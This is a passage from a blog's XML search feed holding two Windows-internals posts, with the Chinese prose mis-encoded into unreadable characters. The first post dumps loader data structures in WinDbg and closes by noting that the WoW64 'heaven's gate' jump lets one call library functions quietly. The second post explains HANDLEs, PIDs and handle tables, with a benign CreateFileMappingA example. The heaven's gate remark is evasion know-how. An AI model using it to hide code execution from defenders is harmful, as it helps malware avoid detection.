   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000000&#96;00000000 - 0x00000000&#96;00000000 ]
   +0x030 DllBase          : 0x00007ffd&#96;b6a70000 Void
   +0x038 EntryPoint       : 0x00007ffd&#96;b6a77af0 Void
   +0x040 SizeOfImage      : 0xa3000
   +0x048 FullDllName      : _UNICODE_STRING &quot;C:\Windows\System32\msvcrt.dll&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;msvcrt.dll&quot;

# ç¬¬å…­ä¸ªä¸º ç©º

0:000&gt; dt _LDR_DATA_TABLE_ENTRY 0x00007ffd&#96;b725a130
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4160 - 0x00000205&#96;cd2b6c60 ]
   +0x010 InMemoryOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b4170 - 0x00000205&#96;cd2b6c70 ]
   +0x020 InInitializationOrderLinks : _LIST_ENTRY [ 0x00000205&#96;cd2b3f90 - 0x00000205&#96;cd2b4860 ]
   +0x030 DllBase          : (null) 
   +0x038 EntryPoint       : (null) 
   +0x040 SizeOfImage      : 0
   +0x048 FullDllName      : _UNICODE_STRING &quot;&quot;
   +0x058 BaseDllName      : _UNICODE_STRING &quot;&quot;
   +0x068 FlagGroup        : [4]  &quot;&quot;
   +0x068 Flags            : 0
   +0x068 PackagedBinary   : 0y0
   +0x068 MarkedForRemoval : 0y0
   +0x068 ImageDll         : 0y0
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>é€šè¿‡è¿™äº›æ•°æ®ç»“æ„ï¼Œå¯ä»¥è·å¾— å¯¹åº” dll çš„åŸºåœ°å€ï¼Œåˆ©ç”¨ wow64 heavenâ€™s gate è·³è½¬åˆ° x64 åå†è°ƒç”¨è¿™äº›æ¥å£ï¼Œæˆ‘ä»¬å°±å¯ä»¥æ‚„æ‚„åœ°æ‰§è¡Œä¸€äº›åº“å‡½æ•°ã€‚è™½ç„¶ç ”ç©¶è¿‡ç›´æ¥è°ƒç”¨ä¸€äº›ç³»ç»Ÿè°ƒç”¨ï¼Œä½†æ˜¯ windows çš„ç³»ç»Ÿè°ƒç”¨å°è£…çš„æ¯”è¾ƒå¥½ï¼Œè¿˜ä¸æ˜¯å¾ˆæ˜ç™½ã€‚</p>
]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>ç•™å‘</tag>
      </tags>
  </entry>
  <entry>
    <title>WIN HANDLE</title>
    <url>/2020/09/27/win_handle/</url>
    <content><![CDATA[<h1 id="é¦–å…ˆä»€ä¹ˆæ˜¯-HANDLE"><a href="#é¦–å…ˆä»€ä¹ˆæ˜¯-HANDLE" class="headerlink" title="é¦–å…ˆä»€ä¹ˆæ˜¯ HANDLE"></a>é¦–å…ˆä»€ä¹ˆæ˜¯ HANDLE</h1><p>Itâ€™s an abstract reference value to a resource, often memory or an open file, or a pipe. (æ¥è‡ªstackoverflow)<br>æˆ‘ä¸ªäººçš„ç†è§£ï¼ŒHANDLE å°±æ˜¯ä¸€ç§ä¸ºäº†ç»Ÿä¸€èµ„æºçš„å°è£…ï¼Œæ‰€æœ‰çš„èµ„æºï¼Œå†…å­˜ï¼Œè¿›ç¨‹ï¼Œç”šè‡³å„ç§å„æ ·çš„è®¾å¤‡ï¼Œéƒ½å¯ä»¥é€šè¿‡ windows apiï¼Œé€šè¿‡ handle æ“ä½œï¼Œæ‹¥æœ‰äº† handleï¼Œå°±æ‹¥æœ‰äº†èµ„æºçš„æ“ä½œæƒã€‚æ¯”å¦‚è¯´ï¼Œåœ¨ windows åˆ›å»ºè¿›ç¨‹çš„è¿‡ç¨‹ä¸­ï¼Œé€šè¿‡ <a href="http://www.rohitab.com/apimonitor">api monitor </a> å¯ä»¥å¾ˆå¥½çš„çŸ¥é“æ“ä½œç³»ç»Ÿåœ¨ç”¨æˆ·æ€å’Œå†…æ ¸äº¤äº’çš„è¿‡ç¨‹ä¸­åšäº†ä»€ä¹ˆï¼Œæˆ‘ä»¬ä¼šå‘ç°ä¸ºäº†åˆ›å»ºä¸€ä¸ªè¿›ç¨‹ï¼Œæˆ‘ä»¬ä¼šè·å–ä¸€æ®µå†…å­˜ï¼Œç„¶åå†æŠŠç¨‹åºæ˜ å°„è¿›å»ï¼Œå¯¹å†…å­˜çš„æ“ä½œä¹Ÿéƒ½æ˜¯é€šè¿‡ HANDLE ä¼ å…¥ä¼ å‡ºå®ç°çš„ã€‚</p>
<h2 id="è¢«é¢è¯•å®˜é—®äº†-HANDLE-å’Œ-PID-çš„å…³ç³»"><a href="#è¢«é¢è¯•å®˜é—®äº†-HANDLE-å’Œ-PID-çš„å…³ç³»" class="headerlink" title="è¢«é¢è¯•å®˜é—®äº† HANDLE å’Œ PID çš„å…³ç³»"></a>è¢«é¢è¯•å®˜é—®äº† HANDLE å’Œ PID çš„å…³ç³»</h2><p>å› ä¸ºæ²¡æœ‰ä»”ç»†åˆ†æï¼Œæˆ–è€…è¯´æ˜¯çœ‹è¿‡ç±»ä¼¼çš„èµ„æ–™ï¼Œåªèƒ½å£ç³Šä¸€ä¸ªã€‚</p>
<p>HANDLE å’Œ PID éƒ½æ˜¯ 32 ä½æ— ç¬¦å·æ•´æ•°ã€‚</p>
<p>ç³»ç»Ÿï¼Œç”¨æˆ·æ ¹æ® pid å”¯ä¸€ç¡®å®šä¸€ä¸ªè¿›ç¨‹<br>å¯ä»¥é€šè¿‡ handle ä»¥åŠ æ¯ä¸ªè¿›ç¨‹çš„å¥æŸ„è¡¨ è·å¾—å†…æ ¸å¯¹è±¡çš„å®é™…åœ°å€ï¼Œæ˜¯ä¸€ç§é—´æ¥çš„æ˜ å°„ã€‚</p>
<h1 id="æ›¾ç»ä»¥å‰çš„è®¤è¯†ï¼Œæ¥è‡ªã€ŠWINDOWSæ ¸å¿ƒç¼–ç¨‹ã€‹"><a href="#æ›¾ç»ä»¥å‰çš„è®¤è¯†ï¼Œæ¥è‡ªã€ŠWINDOWSæ ¸å¿ƒç¼–ç¨‹ã€‹" class="headerlink" title="æ›¾ç»ä»¥å‰çš„è®¤è¯†ï¼Œæ¥è‡ªã€ŠWINDOWSæ ¸å¿ƒç¼–ç¨‹ã€‹"></a>æ›¾ç»ä»¥å‰çš„è®¤è¯†ï¼Œæ¥è‡ªã€ŠWINDOWSæ ¸å¿ƒç¼–ç¨‹ã€‹</h1><p>1.è°ƒç”¨äº†ä¸€ä¸ªåˆ›å»ºå†…æ ¸å¯¹è±¡çš„å‡½æ•°æ—¶ï¼Œå‡½æ•°ä¼šè¿”å›ä¸€ä¸ªå¥æŸ„ï¼Œå®ƒæ ‡è¯†äº†å†…æ ¸å¯¹è±¡ã€‚</p>
<p>2.å†…æ ¸å¯¹è±¡æ˜¯ç”±æ“ä½œç³»ç»Ÿä½¿ç”¨çš„ï¼Œè€Œéè¿›ç¨‹ã€‚</p>
<p>3.å†…æ ¸å¯¹è±¡å¦‚æœè¢«åˆ«çš„è¿›ç¨‹ä½¿ç”¨ï¼Œé‚£ä¹ˆå…¶ä¸­çš„è®¡æ•°å™¨æ²¡æœ‰å‡åˆ°0è¯¥å†…æ ¸å¯¹è±¡å°±ä¸ä¼šè¢«é”€æ¯ã€‚</p>
<p>4.è¿›ç¨‹åˆå§‹åŒ–æ—¶ï¼Œç³»ç»Ÿä¼šç»™è¿›ç¨‹åˆ†é…ä¸€ä¸ªå¥æŸ„è¡¨ï¼Œè¿™ä¸ªè¡¨ä»…ä¾›å†…æ ¸å¯¹è±¡ä½¿ç”¨ï¼Œç”¨æˆ·å¯¹è±¡ç”¨ä¸äº†ï¼Œå¥æŸ„è¡¨æ˜¯ä¸€ä¸ªæ•°æ®ç»“æ„ç»„æˆçš„æ•°ç»„ï¼Œæ¯ä¸ªç»“æ„éƒ½æœ‰ { æŒ‡å‘å†…æ ¸å¯¹è±¡å†…å­˜å—çš„æŒ‡é’ˆï¼Œè®¿é—®æ©ç ï¼Œæ ‡å¿—}</p>
<p>5.è¿›ç¨‹é¦–æ¬¡åˆå§‹åŒ–æ—¶ï¼Œå¥æŸ„è¡¨ä¸ºç©ºï¼Œå½“è¿›ç¨‹å†…çš„ä¸€ä¸ªçº¿ç¨‹è°ƒç”¨ä¸€ä¸ªä¼šåˆ›å»ºå†…æ ¸å¯¹è±¡çš„å‡½æ•°æ—¶ï¼Œå†…æ ¸å°†ä¼šä¸ºè¿™ä¸ªå¯¹è±¡åˆ†é…å¹¶åˆå§‹åŒ–ä¸€ä¸ªå†…å­˜å—ï¼Œç„¶åå†…å­˜æ‰«æè¿›ç¨‹çš„å¥æŸ„è¡¨ï¼ŒæŸ¥æ‰¾ä¸€ä¸ªç©ºç™½çš„è®°å½•é¡¹ï¼Œç„¶åå†™å…¥åˆ°å…¶ä¸­ï¼ˆç³»ç»Ÿå¹²çš„ï¼ï¼‰ï¼Œå…¶ä¸­æŒ‡å‘å†…æ ¸å¯¹è±¡çš„å°±æ˜¯åˆšæ‰é‚£ä¸ªè¿›ç¨‹åˆå§‹åŒ–ä¸­çš„é‚£ä¸ªç»“æ„ä½“çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚</p>
<p>6.é‚£ä»€ä¹ˆæ˜¯handleå‘¢ï¼Œä¸¾ä¸€ä¸ªä¾‹å­</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">#<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
<span class="token comment">/* 
HANDLE CreateFileMappingA(
  HANDLE                hFile,
  LPSECURITY_ATTRIBUTES lpFileMappingAttributes,
  DWORD                 flProtect,
  DWORD                 dwMaximumSizeHigh,
  DWORD                 dwMaximumSizeLow,
  LPCSTR                lpName
);
*/</span>
<span class="token keyword">int</span> <span class="token function">_tmain</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span>TCHAR<span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    HANDLE file <span class="token operator">=</span> <span class="token function">CreateFileMappingA</span><span class="token punctuation">(</span>
        hFile<span class="token punctuation">,</span>
        lpFile<span class="token punctuation">,</span>
        flProtect<span class="token punctuation">,</span>
        dwMH<span class="token punctuation">,</span>
        dwML<span class="token punctuation">,</span>
        lpname
    <span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/*å½“ç¨‹åºä»å…¥å£ç‚¹è¿›å…¥ï¼Œè¿›å…¥åˆ°äº†ä¸»å‡½æ•°(_tmain)ï¼Œä¼šæœ‰ä¸€ä¸ªè¿›ç¨‹äº§ç”Ÿï¼Œæ­¤æ—¶å¥æŸ„è¡¨ä¸ºç©ºï¼Œè¿›ç¨‹æœ¬èº«å•¥ä¹Ÿä¸å¹²ï¼Œè´¼æ‡’ï¼Œã€ã€‘åˆ›å»ºäº†ä¸€ä¸ªä¸»çº¿ç¨‹ï¼Œç„¶åå¼€å§‹è¿è¡Œï¼Œè¿è¡Œåˆ°ä¸‹é¢å‘ç°æœ‰ä¸€ä¸ªCreateFileMappingA()å‡½æ•°ï¼Œè¿›ç¨‹çŸ¥é“è¦åˆ›å»ºå†…æ ¸å¯¹è±¡äº†ï¼Œç„¶åç³»ç»Ÿå¾—çŸ¥ï¼Œç³»ç»Ÿå†æŠŠè¿™ä¸ªå†…æ ¸å¯¹è±¡å†™å…¥åˆ°å†…å­˜ä¸­(åŒ…æ‹¬å†…å­˜åˆå§‹åŒ–)ï¼Œç„¶åå†æŠŠå¯¹åº”çš„æŒ‡é’ˆï¼Œæ©ç ï¼Œæ ‡å¿—ï¼Œå†™åˆ°å¥æŸ„è¡¨ä¸­ã€‚è¿™ä¸ªå¥æŸ„è¡¨åªæœ‰å†…æ ¸æ‰èƒ½æ“ä½œï¼Œç„¶åè¿™ä¸ªå†…æ ¸å¯¹è±¡åªèƒ½é€šè¿‡å…¶å¥æŸ„å’Œä¸€å®šçš„å‡½æ•°æ‰èƒ½æ“ä½œ*/</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>Windows</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>Handle</tag>
      </tags>
  </entry>
</search>
